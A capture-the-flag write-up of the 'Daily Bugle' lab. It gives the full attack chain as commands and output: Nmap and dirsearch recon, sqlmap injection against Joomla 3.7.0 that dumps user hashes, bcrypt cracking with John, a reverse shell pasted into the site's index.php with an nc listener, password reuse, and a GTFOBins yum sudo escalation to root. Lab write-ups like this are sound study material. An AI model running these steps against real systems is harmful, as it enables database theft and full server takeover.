---
title: Daily Bugle 🕷️
tags:
  - Linux
  - Joomla
  - SQLi
  - Brute-Forcing
  - Web
---
![](Pasted%20image%2020240530215716.png)

First of all, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- 10.10.246.142 > sC.txt

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 16:36 CEST
Nmap scan report for 10.10.246.142
Host is up (0.043s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql
```

Then I visited the website (port 80):

![](Pasted%20image%2020240530220117.png)

>[!Answer]
>Access the web server, who robbed the bank?
>`spiderman`

To check the **Joomla** version I did the following:
- More info in [Joomla 🦁](/notes/CMS/Joomla.md)

```shell
curl -s "http://10.10.133.125/administrator/manifests/files/joomla.xml"
```

Which gave me the version:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
        <name>files_joomla</name>
        <author>Joomla! Project</author>
        <authorEmail>admin@joomla.org</authorEmail>
        <authorUrl>www.joomla.org</authorUrl>
        <copyright>(C) 2005 - 2017 Open Source Matters. All rights reserved</copyright>
        <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
        <version>3.7.0</version>
        <creationDate>April 2017</creationDate>
        <description>FILES_JOOMLA_XML_DESCRIPTION</description>

        <scriptfile>administrator/components/com_admin/script.php</scriptfile>

        <update>
                <schemas>
                        <schemapath type="mysql">administrator/components/com_admin/sql/updates/mysql</schemapath>
                        <schemapath type="sqlsrv">administrator/components/com_admin/sql/updates/sqlazure</schemapath>
                        <schemapath type="sqlazure">administrator/components/com_admin/sql/updates/sqlazure</schemapath>
                        <schemapath type="postgresql">administrator/components/com_admin/sql/updates/postgresql</schemapath>
                </schemas>
        </update>

        <fileset>
                <files>
                        <folder>administrator</folder>
                        <folder>bin</folder>
                        <folder>cache</folder>
                        <folder>cli</folder>
                        <folder>components</folder>
                        <folder>images</folder>
                        <folder>includes</folder>
                        <folder>language</folder>
                        <folder>layouts</folder>
                        <folder>libraries</folder>
                        <folder>media</folder>
                        <folder>modules</folder>
                        <folder>plugins</folder>
                        <folder>templates</folder>
                        <folder>tmp</folder>
                        <file>htaccess.txt</file>
                        <file>web.config.txt</file>
                        <file>LICENSE.txt</file>
                        <file>README.txt</file>
                        <file>index.php</file>
                </files>
        </fileset>

        <updateservers>
                <server name="Joomla! Core" type="collection">https://update.joomla.org/core/list.xml</server>
        </updateservers>
</extension>
```

>[!Answer]
>What is the Joomla version?
>`3.7.0`


Then, for finding out jonah's password I performed some enumeration with **dirsearch**:
- More info in [dirsearch 📁](/notes/tools/dirsearch.md)

> *My machine crashed here, so because of that I've got a different ip :^*

```shell
dirsearch -u http://10.10.133.125

[22:04:10] 301 -  243B  - /administrator  ->  http://10.10.133.125/administrator/
[22:04:10] 200 -   31B  - /administrator/cache/                             
[22:04:10] 200 -    2KB - /administrator/includes/
[22:04:10] 301 -  248B  - /administrator/logs  ->  http://10.10.133.125/administrator/logs/
[22:04:10] 200 -   31B  - /administrator/logs/
[22:04:11] 200 -    5KB - /administrator/                                   
[22:04:11] 200 -    5KB - /administrator/index.php
[22:04:13] 301 -  233B  - /bin  ->  http://10.10.133.125/bin/               
[22:04:13] 200 -   31B  - /bin/                                             
[22:04:14] 301 -  235B  - /cache  ->  http://10.10.133.125/cache/           
[22:04:14] 200 -   31B  - /cache/                                           
[22:04:14] 403 -  210B  - /cgi-bin/                                         
[22:04:15] 200 -   31B  - /cli/                                             
[22:04:16] 200 -   31B  - /components/                                      
[22:04:16] 301 -  240B  - /components  ->  http://10.10.133.125/components/ 
[22:04:16] 200 -    0B  - /configuration.php                                
[22:04:23] 200 -    3KB - /htaccess.txt                                     
[22:04:23] 301 -  236B  - /images  ->  http://10.10.133.125/images/         
[22:04:23] 200 -   31B  - /images/                                          
[22:04:24] 301 -  238B  - /includes  ->  http://10.10.133.125/includes/     
[22:04:24] 200 -   31B  - /includes/                                        
[22:04:24] 200 -    9KB - /index.php                                        
[22:04:24] 404 -    3KB - /index.php/login/                                 
[22:04:25] 301 -  238B  - /language  ->  http://10.10.133.125/language/     
[22:04:26] 200 -   31B  - /layouts/                                         
[22:04:26] 301 -  239B  - /libraries  ->  http://10.10.133.125/libraries/   
[22:04:26] 200 -   31B  - /libraries/                                       
[22:04:26] 200 -   18KB - /LICENSE.txt                                      
[22:04:28] 301 -  235B  - /media  ->  http://10.10.133.125/media/           
[22:04:28] 200 -   31B  - /media/                                           
[22:04:29] 301 -  237B  - /modules  ->  http://10.10.133.125/modules/       
[22:04:29] 200 -   31B  - /modules/                                         
[22:04:34] 301 -  237B  - /plugins  ->  http://10.10.133.125/plugins/       
[22:04:35] 200 -   31B  - /plugins/                                         
[22:04:37] 200 -    4KB - /README.txt                                       
[22:04:38] 200 -  836B  - /robots.txt                                       
[22:04:43] 200 -   31B  - /templates/                                       
[22:04:43] 200 -    0B  - /templates/beez3/                                 
[22:04:43] 200 -    0B  - /templates/system/                                
[22:04:43] 301 -  239B  - /templates  ->  http://10.10.133.125/templates/   
[22:04:43] 200 -   31B  - /templates/index.html                             
[22:04:43] 200 -    0B  - /templates/protostar/                             
[22:04:44] 200 -   31B  - /tmp/                                             
[22:04:44] 301 -  233B  - /tmp  ->  http://10.10.133.125/tmp/               
[22:04:48] 200 -    2KB - /web.config.txt
```

I checked the `/administrator` directory, which introduced me to this login page (Joomla admin login):

![](Pasted%20image%2020240530221143.png)

After trying some basic passwords, I decided to search an adequate exploit:

```shell
searchsploit Joomla 3.7.0
```

Which basically said to do this with `sqlmap`:

```shell
sqlmap -u "http://10.10.133.125/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --batch --random-agent --dbs -p list[fullordering]
```

> I added the `--batch` 'cuz I'm lazy

After waiting for literally *27* mins, I got the names of the databases:

```shell
[REDACTED]
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[22:36:48] [INFO] fetching database names
[22:36:48] [INFO] retrieved: 'information_schema'
[22:36:49] [INFO] retrieved: 'joomla'
[22:36:49] [INFO] retrieved: 'mysql'
[22:36:49] [INFO] retrieved: 'performance_schema'
[22:36:49] [INFO] retrieved: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test
```

Then, I looked for the database `joomla`:

```shell
sqlmap -u "http://10.10.133.125/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --batch --random-agent -D joomla --tables --dump -p list[fullordering]

Database: joomla
[72 tables]
+----------------------------+
[REDACTED]
| #__usergroups              |
| #__users                   |
| #__utf8_conversion         |
| #__viewlevels              |
+----------------------------+
```

So, as the structure seemed the same as the [official Joomla documentation](https://docs.joomla.org/Tables), i performed the next scan:

```shell
sqlmap -u "http://10.10.133.125/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T "#__users" -C username,password -p list[fullordering] --dump
```

Which gave me the creds:

```shell
jonah ~ $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

After getting it, I searched its format:

```shell
# using hash-identifier returned nothing
# so I decided to search in Google about "$2y$ hash format"
So it said it is bcrypt
```

So I passed the following command to John:
- More info in [John 🐈‍⬛](/notes/tools/John_The_Ripper.md)

```shell
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
```

>[!Answer]
>What is Jonah's cracked password?
>`spiderman123`

Then, I got access to Joomla, and performed the RCE explained in my note [Joomla 🦁](/notes/CMS/Joomla.md)
- *As a short summary you paste a reverse shell in the index.php file :D*
- You've got the shell I used in [Reverse shells 👾](reverse_shells.md) (The Pentest Monkey one)

1. Set up a listener: `nc -lvp 666`
2. Paste the shell on the `index.php` at the end of it

![](Pasted%20image%2020240530223428.png)

3. Click on `Save`
4. Reload the main page

![](Pasted%20image%2020240530223601.png)

> We've got a shell :D

To estabilise it, though python3 is not installed, python is by the way, so do:
- Again this info is in [Reverse shells 👾](reverse_shells.md) 

```shell
python -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
# Press -> Ctrl + Z
stty raw -echo; fg
```

After this, I first checked the `/home`, but I hadn't permissions to see the content of the user `jjameson`'s home

So I tried to find some credentials for the `mysql` in the `/var/www/html`, which lead me to `/var/www/html/configuration.php`. There I found the following creds:

```shell
public $user = 'root';
public $password = 'nv5uz9r3ZEDzVjNu';
```

So then I logged in the mysql service, but found nothing, so I tried that password with the user `jjameson` and worked

Got the user flag:

![](Pasted%20image%2020240530224323.png)

Then I performed:

```shell
sudo -l

Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

So when I saw this, i wen to [GTFObins](https://gtfobins.github.io/gtfobins/yum/) and searched for yum. Then I applied the following:

```shell
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

>[!Tip]
>Remember the identation in `os.execl('/bin/sh','/bin/sh')`, because if you don't put it it won't work :D

![](Pasted%20image%2020240530224816.png)

==Machine pwned!==